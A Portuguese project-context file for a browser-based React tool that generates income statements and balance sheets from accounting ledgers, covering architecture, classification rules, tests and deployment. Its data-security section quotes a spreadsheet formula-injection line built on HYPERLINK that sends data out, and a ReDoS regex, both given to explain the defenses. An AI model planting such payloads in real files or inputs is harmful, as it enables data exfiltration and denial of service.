# Gerador de DRE — contexto do projeto

Leia isto antes de mexer em qualquer coisa. Este arquivo é o que faz
uma sessão nova de Claude Code entender o projeto sem eu precisar
reexplicar tudo. Mantenha-o atualizado: se você mudar algo que
invalida uma frase daqui, corrija a frase no mesmo commit.

## O que é

App React (Vite) que importa um razão contábil (CSV ou Excel) e monta
a Demonstração do Resultado do Exercício, Balanço Patrimonial
simplificado, análise horizontal e histórico de DREs — peça de
portfólio de Denner (contábil/fiscal, graduando em Ciências Contábeis).
Roda 100% no navegador, sem backend. Site publicado via GitHub Pages
a partir da pasta `/docs`.

Link do site: https://dennereduardo1971-ai.github.io/Gerador-DRE/
Repositório: https://github.com/dennereduardo1971-ai/Gerador-DRE

## Quem usa isto e como

Denner não usa terminal no dia a dia (PC da empresa, sem acesso). Se
você está rodando como Claude Code num ambiente COM terminal e
credenciais de git configuradas, pode commitar e dar `git push`
direto. Se estiver ajudando pelo chat do claude.ai sem terminal do
lado do usuário, o fluxo de entrega é: build local → copiar `dist/`
para `docs/` → empacotar `docs/` em zip → o usuário sobe manualmente
pelo **Add file → Upload files** do GitHub (arrastando a pasta) → o
Pages atualiza sozinho. Nesse caso, também vale empacotar o projeto
inteiro (sem `node_modules`/`dist`) como entregável de backup.

## Arquitetura

```
src/
  lib/                       # lógica pura, sem React — testável isolada
    parse.js                 # leitura do CSV, normalização de número/encoding,
                              # agregação por conta e por competência (mês/ano)
    importarArquivo.js       # ponto único: decide CSV x Excel pela extensão
    importarCSV.js           # CSV em chunks, com progresso real (SEM worker —
                              # ver "Armadilhas conhecidas" abaixo)
    importarExcel.js         # xlsx/xls/xlsm/xlsb/ods via SheetJS, import()
                              # dinâmico (code-splitting — não deixe virar
                              # import estático, ver "Armadilhas")
    classify.js               # GRUPOS da DRE + sugerirClassificacao()
                              # (o coração do projeto — ver seção própria)
    balanco.js                 # Balanço Patrimonial simplificado (contas 1/2)
    exportCsv.js               # exportação da DRE final em CSV
    historico.js                # histórico local de DREs (localStorage) +
                                 # sincronização com githubApi.js
    githubApi.js                 # lê/grava um arquivo JSON no repo via API do
                                  # GitHub — o "banco de dados" do histórico
    grupos.js                     # os grupos da DRE e o sinal de cada um
                                   # (módulo próprio: classify e planoPerfil
                                   #  precisam dele e se importavam em círculo)
    planoPerfil.js                # motor de perfis de plano de contas
    planos/iesb.js                # o plano do IESB, como DADO
    linhasDRE.js                  # a estrutura da DRE (rótulos, sinais,
                                   #  cascata, soma por seção)
    abertura.js                   # balancete simples (código;saldo)
    indicadores.js                # margens, índices e séries do painel
                                   #  (inclui cascataPassos, fonte única
                                   #  compartilhada pelo SVG e pelo PNG)
    imagemPainel.js                # gera o PNG do painel via <canvas>
    balancete.js                  # balancete de verificação hierárquico
                                   #  (traz o Balanço inteiro pronto)
    exportacao.js                 # CSV e Excel, ambos a partir de linhasDRE
    sessao.js                     # persistência da sessão em IndexedDB
    perfil.js                     # perfil de classificação (conta → grupo)
                                   # salvável em arquivo
    useTema.js                    # tema claro/escuro
  components/
    Etapa*.jsx                  # uma etapa do fluxo por arquivo
    LinhaDRE.jsx                 # Linha/Secao/Cabecalho/Detalhe da DRE
    Eixo.jsx                      # Canal e Balanca — o eixo visual
                                   # compartilhado (ver "Sistema visual")
    SincronizacaoGitHub.jsx         # painel de config da sincronização
  App.jsx                        # dono de todo o estado; as Etapas são
                                  # "burras" (recebem props, chamam callbacks)
  App.css                        # design system em variáveis CSS (--papel,
                                  # --tinta, --marca, --barra-* etc.) — tema
                                  # escuro é um seletor
                                  # `:root[data-tema="dark"]` que sobrescreve
                                  # as mesmas variáveis
```

Fluxo do app: Importar → Conferir → Classificar → DRE, com Balanço,
Horizontal e Histórico como abas paralelas que dependem do mesmo
estado agregado (`contas`, calculado uma vez em `App.jsx` via
`agregarPorConta`).

## Sistema visual ("Razão")

A referência é o papel de razão contábil (green-bar paper): daí o
neutro verde-acinzentado e a listra de linha alternada nas tabelas.
Duas regras que não devem ser desfeitas sem motivo:

1. **A cor de marca (índigo) nunca é verde nem vermelha.** Verde e
   vermelho pertencem ao dado — saldo, resultado, diferença que não
   fecha. Se um dia a marca virar verde, a semântica contábil da tela
   deixa de funcionar.
2. **Mono (`Spline Sans Mono`) é só para código de conta.** Valores em
   R$ e percentuais usam Archivo com `font-variant-numeric: tabular-nums`
   (verificado: Archivo tem a feature `tnum`; NÃO tem `zero`, então não
   adianta pedir zero cortado). Mono em coluna de valor engorda a tabela
   e dá cara de editor de código.

### O canal (elemento de assinatura)

`Eixo.jsx` exporta duas primitivas puramente visuais:

- **`Canal`** — a coluna de cascata dentro da própria DRE. Cada linha
  desenha seu segmento começando onde o subtotal anterior parou:
  deduções e custos andam para a esquerda a partir do saldo corrente,
  adições para a direita. O fundo pálido é o nível ANTES da linha (sem
  ele a mordida vermelha flutua no vazio). Subtotais desenham barra
  cheia do zero até o valor.
- **`Balanca`** — o mesmo eixo espelhado, usado em Conferir (débito ×
  crédito) e Balanço (Ativo × Passivo + PL). Os dois braços são índigo
  neutro; **o único trecho vermelho é o excesso de um lado sobre o
  outro**, ou seja, literalmente o que não fecha.

Os números da cascata são calculados em `montarLinhas()` dentro de
`EtapaDRE.jsx`, percorrendo a demonstração em ordem — e **cada subtotal
reancora no valor autoritativo vindo de `montarDRE`**, nunca numa soma
própria. Isso é de propósito: o desenho não pode divergir do número
impresso ao lado se algum grupo for exibido condicionalmente.

Uma tentação a evitar: já existiu uma barrinha de variação divergente
na Análise Horizontal e ela foi removida. Com uma variação atípica
(+424% num mês) a escala compartilhada esmaga todas as outras e as
barras viram slivers invisíveis — o número já dizia tudo.

### Piso de qualidade

Responsivo até 390px (tabelas com descrição textual viram cartões
empilhados via `.tabela-cartao` + `data-rotulo`; tabelas curtas e
numéricas rolam na horizontal), foco de teclado visível em todo
interativo, `prefers-reduced-motion` respeitado, `@media print`
preservando só a demonstração. A dropzone é operável por teclado
(Enter/Espaço) e os `<select>` de grupo e checkboxes de tabela têm
`aria-label` próprio, porque o cabeçalho da coluna sozinho não nomeia
o controle.

## O coração do projeto: classificação de contas

`sugerirClassificacao()` em `classify.js` decide em qual grupo da DRE
(`GRUPOS`) cada conta de resultado cai. Isto NÃO é um classificador
genérico — foi calibrado e testado contra o plano de contas real de
uma instituição de ensino (IESB), então entenda o raciocínio antes de
mudar:

1. **Decisão é por conta individual**, não por maioria de um grupo de
   contas. Isso já foi tentado (maioria por prefixo de 3 dígitos) e
   quebrou contra dados reais: o mesmo prefixo pode conter sub-contas
   de grupos completamente diferentes (ex. um prefixo com Bolsas,
   Descontos, Devoluções e Impostos misturados).
2. Cada conta é testada contra um **texto enriquecido**: histórico dos
   lançamentos + nome da própria conta (se houver plano de contas
   importado) + nome de **cada conta ancestral** no plano de contas
   (cortando o código um dígito de cada vez). Isso resolve o caso comum
   de conta-folha com nome genérico cuja natureza real só aparece no
   nome da conta-síntese pai.
3. **A ordem dos padrões `PAT_*` importa.** Padrões mais específicos
   têm que vir antes dos mais genéricos, porque termos se sobrepõem em
   plano de contas real:
   - `PROVISAO IRPJ`/`PROVISAO CSLL` bate em "provisão" E em "IRPJ/CSLL"
     → IRPJ/CSLL tem que ser checado antes de Provisões.
   - `PIS S/FOLHA PAGAMENTO` (encargo trabalhista, grupo Fopag) bate em
     "PIS" igual a `(-)PIS` (imposto sobre receita, grupo Deduções) →
     Fopag é checado antes de Impostos.
4. Sem plano de contas importado, cai num **fallback por maioria do
   prefixo de 3 dígitos** (o comportamento antigo, mais grosseiro, mas
   que não depende de nome nenhum).
5. Classificações manuais do usuário (`classif` em `App.jsx`) sempre
   têm prioridade sobre a sugestão automática — importar um novo plano
   de contas nunca desfaz uma escolha manual.

**Antes de mudar um padrão `PAT_*` ou a ordem de prioridade**, rode
contra um arquivo real (ver skill `testar-com-arquivo-real`) e
confira: (a) nenhuma conta sobra em "Não entra na DRE" quando há plano
de contas, (b) a soma de todos os grupos bate com a soma absoluta de
todas as contas de resultado (nada se perde ou duplica), (c) o
Lucro Líquido final não muda por acaso — se mudar, entenda por quê
antes de aceitar.

### Camada de código exato (plano de contas do IESB)

Acima do classificador por texto existe uma segunda camada, mais forte:
`MAPA_CODIGO_IESB` em `classify.js` liga cada conta-síntese do plano de
contas do IESB (ex. `31101`, `32104`, `41101`) direto ao grupo da DRE,
sem depender de palavra nenhuma. Ela só entra em ação quando o plano de
contas importado bate a "assinatura" do IESB (`assinaturaPlanoIESB` —
checa o nome das contas-síntese 3/4/5/6); com outro plano de contas, ou
sem plano nenhum, cai no texto/histórico como sempre caiu.

Essa camada foi validada linha a linha contra a DRE real de jan a
jun/2026 (script `fixtures/validar.mjs`, arquivos reais do Denner em
`fixtures/`, ignorados no git) — bateu **centavo a centavo** em todo
grupo, inclusive Lucro Líquido final. Rode esse script depois de
qualquer mudança em `classify.js` ou `parse.js` para garantir que não
regrediu:

```bash
node fixtures/validar.mjs
```

Três coisas importantes que esse trabalho revelou, para não serem
desfeitas por acidente:

1. **Custo dos Serviços ≠ Despesas com Pessoal.** A folha dos DOCENTES
   (`411`/`4110`) é Custo dos Serviços (quem entrega o serviço-fim); a
   folha do administrativo (`4111`) e do apoio acadêmico (`4112`) é
   Despesas com Pessoal (Fopag) dentro de Despesas Operacionais. São
   grupos diferentes por desenho contábil, não por coincidência.
2. **Há exceções pontuais no próprio plano de contas** que o mapa por
   código sozinho erraria — contas-folha cujo nome diz uma coisa e cujo
   grupo-pai no plano diz outra (ex. conta de PROUNI dentro do grupo
   "Bolsas Estudantis"; conta de IPTU de imóvel de investimento dentro
   de "Provisões", mas tratada como Não Operacional na DRE oficial).
   Ver `EXCECOES_CODIGO_IESB` e o comentário de `grupoPorCodigoIESB`.
3. **`montarDRE` soma o saldo com sinal, não a magnitude.** Grupos como
   Provisões misturam de verdade contas de despesa (nova provisão) com
   contas de receita (reversão/estorno) na MESMA linha da DRE oficial —
   em meses onde a reversão supera a provisão nova, a linha vira
   positiva de verdade (reduz despesa). Somar `Math.abs(saldo)` por
   conta, como o código fazia antes, perde esse líquido e infla o
   grupo. Por isso `bal[g].total` acumula `saldo * sinalDoGrupo`, não
   `Math.abs(saldo)` — e a tela (`EtapaDRE.jsx`) e o CSV
   (`exportCsv.js`) mostram o valor líquido de verdade (podendo aparecer
   uma despesa "positiva" num mês de reversão forte), em vez de forçar
   parênteses de despesa sempre.
4. **Provisões é, na DRE oficial, DUAS linhas, não uma**: "Provisões/
   Reversões Contingências" (cíveis/trabalhistas, novas e revertidas —
   contas `6110100`, `6110101`, `6110102`, `6110104`, `6110105`,
   `6110115`, `6110116`) e "Provisões/Reversões PCLD" (perdas estimadas
   com créditos de liquidação duvidosa, fiscal e societária, novas e
   revertidas — contas `6110103`, `6110106`, `6110111`, `6110112`,
   `6110114`, `6110119`). Os grupos na DRE são `PROVISOES_CONTINGENCIAS`
   e `PROVISOES_PCLD`. Não junte de volta numa linha só sem confirmar
   contra a DRE oficial — foi assim que apareceu o erro da primeira
   versão dessa camada.

## Regras da DRE (estrutura fixa em `montarDRE`)

```
Receita Bruta = Mensalidades + Taxas
Receita Líquida = Receita Bruta − Deduções (Bolsas + Prouni + Devoluções + Descontos + Impostos)
Resultado Operacional Bruto = Receita Líquida − Custos
Despesas Operacionais = Fopag + Administrativas + Depreciação + Provisões
Resultado Financeiro = Receitas Financeiras − Despesas Financeiras
Resultado Operacional = Resultado Operacional Bruto − Despesas Operacionais + Resultado Financeiro
Não Operacional = Outras Receitas − Outras Despesas
Antes do IR = Resultado Operacional + Não Operacional
Lucro Líquido = Antes do IR − IRPJ/CSLL
```

Essa hierarquia foi calibrada contra uma DRE real (formato
`DRE-BALANÇO_INTERMEDIÁRIOS`, seções em caixa alta com prefixo
`( + )`/`( – )`/`( = )`). Se for generalizar para outro tipo de
empresa (comércio, indústria), ANTES de mexer na estrutura, considere
se dá para fazer só adicionando um grupo novo em `GRUPOS` — é bem mais
seguro que reescrever a hierarquia de subtotais.

## Armadilhas conhecidas (não repita)

- **Papaparse com `worker: true` quebra em produção.** Funciona em
  `npm run dev` mas quebra no build publicado (GitHub Pages, qualquer
  subcaminho) com um erro `charCodeAt is not a function` vindo de um
  script com nome de UUID — é o worker tentando carregar um script por
  URL que não resolve no bundle empacotado. `importarCSV.js` usa
  `worker: false` com `parser.pause()/resume()` de propósito. Não
  reverta isso sem testar contra um build real publicado.
- **`xlsx` (SheetJS) tem que ser `import()` dinâmico**, não import
  estático — senão o bundle principal engorda ~350KB pra quem só usa
  CSV. Ver `importarExcel.js`.
- **Números de Excel com célula numérica nativa**: não formate como
  texto antes de somar (`raw: false` no SheetJS introduz ambiguidade
  de locale — "1,234.56" americano vira "1.23456" se tratado como
  BR). Deixe como número nativo do JS; `numeroBR()` em `parse.js` já
  lida bem com número OU string.
- **Zero à esquerda em conta armazenada como número numa célula
  Excel** se perde — isso é do próprio Excel, não é bug do app.
  Documentado no README, não tem solução no nosso lado.
- **A vulnerabilidade conhecida do pacote `xlsx` do npm** (prototype
  pollution + ReDoS, sem correção nessa distribuição) é aceita
  conscientemente — app roda só no navegador do próprio usuário,
  processando arquivo que ele mesmo escolhe abrir. Documentado no
  README. Não troque de lib sem avisar, `exceljs` (a alternativa mais
  óbvia) não lê `.xls` legado.
- **Nunca commite os arquivos reais de razão/plano de contas do
  Denner** (números financeiros de instituição real) — ficam em
  `fixtures/`, que está no `.gitignore`.

## Como testar

Duas camadas, e as duas importam:

1. **Vitest** (`npm test`) — testes em `src/lib/__tests__/`, com razão
   sintético. Rodam em qualquer máquina, sem dado real. Eles congelam
   de propósito as decisões que já custaram caro: o cabeçalho real do
   razão do IESB, a separação custo/fopag, Prouni fora de Bolsas,
   provisões em duas linhas, a soma líquida (reversão reduz despesa) e
   a hierarquia de subtotais. Se um deles ficar vermelho depois de uma
   mudança sua, presuma regressão até provar o contrário.
2. **`node fixtures/validar.mjs`** — a validação contra a DRE real, mês
   a mês, centavo a centavo. Insubstituível: o Vitest prova que a lógica
   não mudou, mas só o arquivo real prova que ela está certa. Rode
   sempre que mexer em `classify.js` ou `parse.js`. Precisa dos arquivos
   em `fixtures/`, que estão no `.gitignore` — se você está numa máquina
   sem eles, diga isso ao usuário em vez de fingir que validou.

## Build e publicação

Desde a integração contínua, **publicar é só dar push na `main`**: o
workflow builda e commita `docs/` sozinho. O passo manual abaixo continua
valendo para quem quer conferir o build localmente antes:

```bash
npm install
npm test             # 79 testes
npm run build        # gera dist/
rm -rf docs && cp -r dist docs   # normalmente desnecessário: o CI faz
```

O `vite.config.js` usa `base: './'` (caminho relativo) de propósito —
funciona tanto em GitHub Pages num subcaminho (`/Gerador-DRE/`) quanto
aberto localmente, sem precisar reconfigurar nada.

## Skills deste projeto

- `.claude/skills/testar-com-arquivo-real/` — como validar mudanças em
  `parse.js`/`classify.js` contra um razão e plano de contas reais,
  sem quebrar nada silenciosamente.
- `.claude/skills/ajustar-classificacao-dre/` — como adicionar ou
  recalibrar um padrão de classificação com segurança (ordem de
  prioridade, os testes que rodar antes de aceitar).
- `.claude/skills/build-e-publicar/` — o fluxo de build + deploy,
  adaptado conforme você tiver ou não acesso a terminal/git push.

## Persistência e perfil

`sessao.js` guarda a sessão inteira (razão, mapeamento, classificações,
empresa/CNPJ, filtros) em **IndexedDB** — não localStorage, que é
síncrono e não aguenta o volume do razão. Duas sutilezas que não devem
ser desfeitas:

- A gravação só começa depois que a restauração termina
  (`sessaoCarregada`). Sem essa trava, o estado vazio do primeiro render
  sobrescreve a sessão salva e o usuário perde tudo justamente ao abrir.
- Como isso deixa dado financeiro real no disco da máquina — e o Denner
  usa PC de empresa —, **"Limpar tudo" tem que continuar sendo um botão
  visível**, não uma opção escondida.

`perfil.js` serializa o mapa conta → grupo num arquivo JSON. Ele guarda
**só decisões e nomes de conta, nunca valores** — de propósito, para
poder ser versionado ou compartilhado sem carregar número de cliente
nenhum. Ao carregar, `cobertura()` responde "esse perfil serve para este
razão?" antes de aplicar. Contas vindas do perfil entram como `tocadas`
(manuais), porque é o que elas são: alguém já decidiu antes.

## Perfil de plano de contas

O plano do IESB **não mora mais em `classify.js`** — virou dado em
`planos/iesb.js`, lido pelo motor em `planoPerfil.js`. Atender outro
cliente é carregar um arquivo pela etapa 3, sem commit e sem build.

Duas coisas que não devem ser afrouxadas:

- **A assinatura é obrigatória.** Um perfil sem assinatura é recusado na
  leitura. Sem ela não há como saber se o perfil serve para o plano
  importado, e aplicar o perfil errado distribuiria os valores de forma
  silenciosamente errada — que é exatamente a classe de defeito que este
  projeto mais tenta evitar.
- **A resolução é do código mais específico para o mais genérico.** A
  conta-folha exata vence a conta-síntese que a contém. É isso que faz
  as exceções (3210208, 6110113) e o IRPJ/CSLL dentro de 611 caírem no
  lugar certo sem nenhuma lista de prioridade à parte.

Regras cobrem o que não cabe num mapa de prefixo: `tipo: "nome"` (Prouni
morando dentro de Bolsas) e `tipo: "sinal"` (seções que misturam receita
e despesa). `quando: "antes"` roda antes do mapa; `"depois"`, só se o
mapa não resolveu.

Ao mexer aqui, os testes de `planoPerfil.test.js` cobrem a mecânica, mas
**só `fixtures/validar.mjs` prova que o perfil do IESB continua certo.**

## Exportação

`exportacao.js` gera CSV e Excel a partir de `montarLinhas` — a mesma
função que desenha a tela. Antes o CSV reconstruía a DRE à mão, com os
rótulos digitados de novo: no dia em que alguém mudasse a estrutura e
esquecesse do segundo lugar, o arquivo entregue ao cliente divergiria
silenciosamente da tela conferida. **Não volte a escrever a estrutura da
DRE em nenhum outro lugar.**

O PDF é a impressão do navegador (o CSS de impressão já existia), não uma
biblioteca. É menos configurável, mas não adiciona 300 kB ao bundle nem
um segundo motor de layout para manter em sincronia com a tela.

## Balancete de abertura

`abertura.js` resolve pela raiz a limitação do Balanço que antes só se
podia avisar: o razão de um mês não carrega saldo inicial, então o
Balanço era a variação do período. Com o balancete carregado,
`montarBalanco` passa a calcular abertura + movimentação = saldo final, e
`comAbertura` diz em qual dos dois modos o resultado está — a tela usa
isso para não mostrar o aviso errado.

Duas decisões que parecem detalhe e não são: código repetido **soma** (há
sistemas que quebram a mesma conta por centro de custo, e sobrescrever
perderia dinheiro calado), e conta que só existe no balancete **entra**
no Balanço com movimento zero (se sumisse, o Balanço continuaria errado,
que é o problema que o balancete veio corrigir).

## Balancete de verificação

`balancete.js` lê o relatório que o sistema contábil emite de verdade
(`ctbr041`): código pontuado em vários níveis, saldo anterior, débito,
crédito, movimento e saldo atual, com a natureza indicada por "D"/"C" no
fim do número. Quando esse formato é reconhecido, ele vira a FONTE do
Balanço e o razão passa a ser a contraprova — não o contrário.

Quatro armadilhas deste formato, todas cobertas por teste:

- **Os níveis não têm largura fixa** (1, 2, 3, 5 e 7 dígitos no plano do
  IESB) e **um nível pode ser pulado**: `1.3.40.0` pendura direto em
  `1.3`, porque `1.3.4` não existe. Por isso o pai é o *prefixo mais
  longo que existe*, nunca "um nível acima".
- **As sintéticas já vêm somadas.** Totalizar tudo dá o dobro; só as
  folhas entram em qualquer soma calculada aqui.
- **O ponto é ambíguo dentro do mesmo arquivo**: colunas formatadas vêm
  em pt-BR (`393.899.653,88`) e colunas numéricas cruas vêm com ponto
  decimal (`393899653.88`). Quem desempata é a vírgula, igual a
  `numeroBR`. Tratar ponto como milhar nos dois casos multiplicava o
  movimento do período por cem.
- **O balancete das contas 1 e 2 NÃO fecha, e não deve fechar.** A
  diferença entre Ativo e Passivo + PL é o resultado do exercício, que
  está nas contas 3 a 7. No arquivo real: 253.582.263,93 − 252.651.704,84
  = 930.559,09, idêntico a débitos − créditos do período. **Nunca trate
  isso como erro de importação.** A tela escreve a identidade e, havendo
  razão do mesmo período, confronta o valor com o Lucro Líquido da DRE.

## Painel

`Painel.jsx` responde "e daí?", enquanto as outras telas respondem "os
números estão certos?". São públicos diferentes: quem confere abre a DRE
e o balancete, quem decide abre o painel.

Cada bloco depende de uma fonte e só aparece se ela existir — margens
precisam do razão, índices patrimoniais precisam do balancete. **Nunca
mostre zero no lugar de dado ausente**: `indicadores.js` devolve `null`
quando o denominador é zero, porque uma liquidez corrente em 0,00 parece
diagnóstico ("não cobre o curto prazo") quando na verdade é ausência de
passivo circulante. Endividamento 0% é diferente: aí o zero é resposta.

A classificação circulante × não circulante × PL é feita pelo **nome** do
grupo, não pelo código: no plano do IESB, `1.2` e `1.3` são ambos Ativo
Não Circulante, e outro plano usaria outra numeração.

### Sobre o 3D

As torres patrimoniais (`TorresPatrimoniais.jsx`) são o único lugar com
três dimensões, e é deliberado. O Balanço É duas pilhas de mesma altura,
então volume e perspectiva tornam a igualdade física — dá para ver que as
torres terminam no mesmo nível antes de ler qualquer número.

**Não estenda 3D aos outros gráficos.** Perspectiva distorce comparação:
a barra mais próxima parece maior que outra de mesmo valor, e num painel
financeiro isso deixa de ser estilo e vira erro de leitura. Cascata,
evolução e ranking são 2D e precisos de propósito.

Feito com transformações CSS, não com three.js: uma biblioteca 3D
custaria mais de 600 kB num app cujo bundle tem 300, para desenhar
caixas. Todo o painel — indicadores, três gráficos SVG e as torres —
somou 15 kB.

## Armazenamento de arquivos (imagens e outros)

`githubApi.js` ganhou `listarPasta`/`enviarArquivo`/`excluirArquivo`,
que usam a mesma API de Conteúdo do GitHub que já sincroniza o
`historico.json` — mesmo token, mesmo repositório, sem serviço novo.
Arquivos ficam em `data/arquivos/` e a interface é `Arquivos.jsx`.

**O aviso de repositório público não é opcional e não é rodapé.** Se o
repo for público (o normal de um projeto no GitHub Pages), todo arquivo
enviado por aqui fica acessível a qualquer pessoa, sem login, e continua
no histórico do Git mesmo depois de excluído pela interface. `Arquivos.jsx`
mostra esse aviso ANTES de liberar qualquer envio, e o botão "Salvar no
GitHub" do Painel pede confirmação explícita a cada uso — não é um "aceitar
uma vez e esquecer". Isso importa mais aqui do que no `historico.json`
porque a imagem do painel carrega valores financeiros reais legíveis
direto na miniatura, não só um número dentro de um JSON.

Limite de 1 MB por arquivo: é o teto prático da API de Conteúdo em
base64 num único request. Arquivos maiores precisariam do fluxo de blobs
da Git Data API, que não foi implementado por não ser necessário para o
que o próprio app gera.

## Imagem do painel

`imagemPainel.js` desenha o PNG em `<canvas>`, não captura o DOM.
Capturar exigiria uma biblioteca tipo html2canvas (~50 kB) e ainda assim
tropeçaria nas variáveis CSS e nas transformações 3D das torres
patrimoniais. Desenhar do zero usa os MESMOS dados computados que a tela
(`indicadores.js`) — a cascata da imagem é `cascataPassos()`, a mesma
função que desenha o SVG da tela, extraída de propósito para as duas
técnicas de desenho não poderem divergir sobre o que a cascata representa.

**As torres 3D não entram na imagem.** Um retrato estático da perspectiva
exigiria reimplementar a projeção 3D em canvas só para uma imagem — não
paga o esforço. A imagem cobre indicadores, cascata, evolução e ranking.

A paleta usa cores concretas (`PALETAS.claro`/`escuro`), não variáveis
CSS: um arquivo exportado precisa se bastar sozinho, sem depender de uma
folha de estilos que não vai junto com o PNG.

## As duas fontes (razão × balancete)

**Elas descrevem o mesmo fato por caminhos diferentes.** O razão soma
lançamento a lançamento até chegar no movimento de cada conta; o
balancete já traz esse movimento somado e fechado pela contabilidade.
`contasDeMovimento()` converte as folhas do balancete para o formato de
`agregarPorConta`, e `fontes.test.js` prova que a DRE sai idêntica pelos
dois caminhos, linha por linha.

**Atenção ao sinal.** `agregarPorConta` usa `saldo = crédito − débito`
(natureza credora positiva, que é o que `montarDRE` espera para
receitas); o balancete usa `movimento = débito − crédito`. Um é o
negativo do outro. "Simplificar" isso inverte a DRE inteira sem quebrar
mais nada visivelmente — há teste explícito guardando esse ponto.

**Qual manda.** `fonteEfetiva = balancetePodeDRE && fonte !== "razao"`.
Ou seja: o balancete vence por padrão quando cobre contas de resultado,
porque passou pelo fechamento; o razão só assume por escolha explícita.

**Não são redundantes — e é por isso que o razão fica:**

| | Balancete | Razão |
|---|---|---|
| DRE e Balanço | sim | DRE sim, Balanço parcial |
| Plano de contas | vem junto | arquivo separado |
| Competência mês a mês | não (retrato de um período) | sim |
| Centro de custo | não | sim |
| Lançamento individual | não | sim |
| Confiabilidade | fechado pela contabilidade | somado pelo app |

Por isso Comparativa, Horizontal e o filtro de centro de custo continuam
dependendo do razão, e `FonteDados.jsx` diz isso na tela antes de alguém
trocar de fonte sem entender o que perde.

**Balancete filtrado.** `coberturaBalancete()` detecta quais dígitos raiz
o arquivo traz. O relatório típico de fechamento patrimonial vem filtrado
só em 1 e 2 — aí ele monta o Balanço mas não a DRE, e a tela explica que
basta exportar o mesmo relatório sem filtrar por conta.

**O balancete traz o plano de contas de graça.** `nomesDoBalancete()`
devolve código → descrição de todas as contas, sintéticas inclusive. Como
a classificação por código reconhece o plano pela ASSINATURA (nome das
contas-síntese de topo), carregar o balancete dispensa o arquivo separado
de plano de contas. Em `App.jsx`, `nomesEfetivos` põe os nomes do
balancete por baixo dos importados à mão — o usuário mantém a última
palavra.

## Segurança dos dados

Este app lida com movimentação financeira real de uma instituição. Os
pontos abaixo saíram de uma auditoria e **não devem ser afrouxados.**

**`.gitignore` protege `fixtures/` e toda planilha.** Antes não protegia:
só por sorte nenhum razão real foi commitado. Commit não se apaga — uma
vez versionado, o dado sobrevive no histórico e em todo clone. A regra é
`fixtures/*` com exceção para `*.mjs`, mais `*.xlsx`/`*.csv`/etc. em
qualquer pasta.

**Injeção de fórmula no CSV** (`neutralizarFormula`). Excel avalia como
fórmula qualquer célula iniciada por `= + - @` tab ou CR. Uma descrição
de conta como `=HYPERLINK("http://...&"&A1)` vira link que exfiltra dados
da planilha. O texto vem do plano de contas e do histórico do razão —
dados que o app não controla — e o destino do CSV é ser aberto no Excel
por um contador. A defesa é prefixar com aspa simples. O Excel (xlsx)
não precisa disso: SheetJS grava célula de texto como texto, não fórmula.

**ReDoS via perfil de plano de contas** (`padraoSeguro`). `regras` do
tipo `nome` traziam regex de arquivo direto para `new RegExp`. `(a+)+$`
contra 30 caracteres leva mais de 30 segundos e **congela a aba de vez**
— JavaScript não interrompe regex em andamento. Padrão com quantificador
aninhado, maior que 120 caracteres ou inválido é recusado na leitura e a
regra é descartada com aviso, em vez de derrubar o app.

**Visibilidade do repositório é consultada, não presumida.** A tela de
Arquivos pergunta à API se o repo é público ou privado e muda o texto do
aviso. Presumir foi como o aviso ficou factualmente errado antes —
dizendo "este repositório é público" para um repositório privado, o que
tanto assusta à toa quanto ensina o usuário a ignorar avisos.

**Riscos aceitos conscientemente** (documentados, não corrigidos):

- *Token do GitHub em `localStorage`* — qualquer XSS o vaza. Mitigado por
  não haver nenhum ponto de injeção de HTML no app (sem
  `dangerouslySetInnerHTML`, sem `innerHTML`, sem `eval`), e pela
  orientação de usar token fine-grained, só deste repositório, com
  expiração curta.
- *`xlsx` 0.18.5 tem duas falhas altas conhecidas* (prototype pollution e
  ReDoS, GHSA-4r6h-8v6p-xvw6 e GHSA-5pgg-2g8v-p4x9) e **não há correção
  no npm** — o SheetJS saiu do registro público na versão 0.20. Atualizar
  exige apontar para `cdn.sheetjs.com`, o que quebra `npm ci` no CI. O
  risco concreto exige abrir uma planilha maliciosa, e os arquivos aqui
  vêm do próprio sistema contábil do usuário.
- *Sessão em IndexedDB sem criptografia* — dado financeiro fica no disco
  da máquina. É o preço de não perder a importação num F5; por isso
  "Limpar tudo" precisa continuar sendo botão visível.

## Integração contínua

`.github/workflows/ci.yml` roda lint, testes e build em todo push e PR, e
publica `docs/` automaticamente na `main`. `docs/**` está no
`paths-ignore` de propósito: o job de publicação commita nessa pasta, e
sem a exclusão cada publicação dispararia outra, em loop.

## Ideias de expansão (backlog, não compromissos)

Na ordem que eu (Claude) priorizaria, já sem o que foi feito:

1. **Editor de perfil de plano na própria interface** — hoje dá para
   CARREGAR um perfil de plano, mas para criar um do zero ainda é
   preciso escrever o JSON à mão. Uma tela que gere o perfil a partir
   das classificações feitas por código fecharia o ciclo.
2. **Seletor de aba do Excel** — `importarExcel.js` escolhe a primeira
   aba com dados; já devolve `abas`, falta UI.
3. **Circulante × Não Circulante no Balanço** — agora que existe saldo de
   abertura, o passo seguinte é classificar por hierarquia do plano de
   contas e transportar o resultado do exercício para o PL.
4. **Agregar durante a importação** em vez de guardar `linhas` cru em
   memória — tiraria o teto de tamanho de arquivo.
